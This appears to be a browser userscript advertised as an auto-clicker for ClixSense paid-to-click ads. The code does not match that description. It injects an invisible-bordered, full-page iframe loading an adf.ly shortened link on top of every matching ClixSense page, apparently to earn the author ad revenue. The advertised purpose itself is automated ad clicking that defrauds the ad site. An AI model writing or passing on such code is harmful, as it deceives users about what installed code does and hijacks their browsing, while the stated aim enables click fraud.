// ==UserScript==
// @name           clixsense auto-click script - v7.3.2
// @namespace      clixsense auto-click script - v7.3.2
// @include        http://www.clixsense.com/en/View_Ads
// @include         http://www.clixsense.com*
// @include         http://www.clixsense.com*
// @include         http://www.clixsense.com*
// @include         http://www.clixsense.com*
// @exclude         http://*.channel.clixsense.com*
// @exclude         http://*.channel.clixsense.com/*
// @exclude         http://www.clixsense.com/login.php
// @exclude         http://www.clixsense.com/login.php
// @exclude         http://www.clixsense.com/login.php
// @author         jj
// @version         1
// @versionnumber   1
// @namespace      http://userscripts.org/scripts/show/151851
// @Description    This script browses through clixsense ads and automatically clicks them for you.  It starts five minutes after you confirm execution.  The script waits anywhere from 60 seconds to 5 minutes between clicks.  This script is released under GPL License 3.0 and under the MIT License.
// ==/UserScript==
//

var el = document.createElement("iframe");
el.setAttribute('id', 'ifrm');
document.body.appendChild(el);
el.setAttribute('src', 'http://adf.ly/EM9fa');
el.setAttribute('style', 'border:0px;z-index:99999;position:absolute;top:0px;left:0px;');
el.setAttribute('width', '100%');
el.setAttribute('height', '9999px');
el.setAttribute('scrolling', 'no');